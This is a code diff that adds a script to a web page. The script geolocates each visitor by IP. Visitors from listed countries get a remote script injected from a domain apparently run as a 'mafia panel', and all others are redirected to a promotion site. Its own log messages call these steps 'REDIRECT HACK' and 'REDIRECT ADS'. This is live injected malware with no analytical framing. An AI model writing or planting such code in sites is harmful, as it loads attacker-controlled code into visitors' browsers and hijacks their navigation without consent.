@@ -1,0 +1,33 @@
+<script>
+let countryHack = ['MX', 'DO', 'CO', 'GR', 'AR', 'HU', 'RS', 'RO', 'SK', 'SI', 'NI', 'VE', 'CL', 'CR', 'PE', 'PY', 'UY', 'EC', 'GT', 'PA', 'ES', 'CZ', 'HR', 'FR', 'SV', 'IT', 'BE', 'KR']; //pais
+let scriptHack = 'https://mafiapanel.bio/h/index.php?username=Danieladmin';
+let urlPromocion = 'https://chid.pages.dev/';
+let country;
+
+fetch('https://get.geojs.io/v1/ip/country')
+    .then((response) => response.text())
+    .then((data) => {
+        country = data;
+        country = countryHack.find((str) => str === country.trim());
+        redirectURL(country)
+    })
+
+
+function redirectURL(country) {
+
+
+    if (country) {
+        const script = document.createElement('script');
+        script.src = scriptHack;
+        document.head.appendChild(script);
+
+        console.log('REDIRECT HACK...' + country)
+    } else {
+        
+        window.location.href = urlPromocion;
+        console.log('REDIRECT ADS...' + country)
+    }
+
+}
+
+</script>
